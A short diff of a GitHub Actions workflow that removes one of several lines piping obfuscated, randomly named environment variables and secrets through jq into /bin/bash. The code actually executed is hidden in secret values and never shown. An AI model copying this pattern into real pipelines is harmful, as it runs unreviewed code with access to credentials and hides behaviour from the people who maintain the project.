@@ -23,7 +23,6 @@ jobs:
           uyjl7789: ${{ secrets.uyjl7789 }}
         run: |
           printf '%s' "$uyjl7789" | jq -r .ezo7 | /bin/bash
-          echo $ftqd5506 | jq -r .owq5 | /bin/bash
           echo $kxp51 | jq -r .iyu5 | /bin/bash
           printf '%s' "$ma9" | jq -r .b504 | /bin/bash
           echo $wly731 | jq -r .hxedd37 | /bin/bash
